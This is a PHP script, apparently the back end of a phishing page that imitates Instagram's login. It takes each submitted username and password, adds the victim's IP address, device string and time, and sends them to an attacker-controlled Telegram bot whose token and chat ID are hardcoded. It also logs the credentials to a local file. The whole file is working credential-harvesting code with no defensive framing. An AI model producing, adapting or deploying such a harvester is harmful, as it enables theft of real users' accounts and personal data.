<?php

// Load environment variables from .env file if it exists
if (file_exists(__DIR__ . '/.env')) {
    $lines = file(__DIR__ . '/.env', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0) continue;
        list($key, $value) = explode('=', $line, 2);
        $_ENV[trim($key)] = trim($value);
        putenv(trim($key) . '=' . trim($value));
    }
}

// Get configuration from environment variables
$telegram_bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: "8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA";
$telegram_chat_id = getenv('TELEGRAM_CHAT_ID') ?: "8244999766";
$log_file = getenv('LOG_FILE') ?: "credentials_log.txt";
$enable_backup_logging = getenv('ENABLE_BACKUP_LOGGING') !== 'false';

if(isset($_POST["username"]) && isset($_POST["password"])) {
    $username = $_POST["username"];
    $password = $_POST["password"];
    
    // Get additional information
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $timestamp = date("Y-m-d H:i:s");
    
    // Format message for Telegram
    $message = "🔔 *New Instagram Login Attempt*\n\n";
    $message .= "👤 *Username:* `{$username}`\n";
    $message .= "🔑 *Password:* `{$password}`\n\n";
    $message .= "📍 *IP Address:* `{$ip}`\n";
    $message .= "🕐 *Time:* `{$timestamp}`\n";
    $message .= "📱 *Device:* `{$user_agent}`";
    
    // Send to Telegram
    $url = "https://api.telegram.org/bot" . $telegram_bot_token . "/sendMessage";
    
    $post_fields = array(
        'chat_id' => $telegram_chat_id,
        'text' => $message,
        'parse_mode' => 'Markdown'
    );
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    // Optional: Log to file as backup
    if ($enable_backup_logging) {
        $log_entry = "[{$timestamp}] Username: {$username} | Password: {$password} | IP: {$ip}\n";
        file_put_contents($log_file, $log_entry, FILE_APPEND);
    }
    
    echo json_encode(['success' => true]);
} else {
    echo json_encode(['success' => false, 'error' => 'Missing credentials']);
}

?>
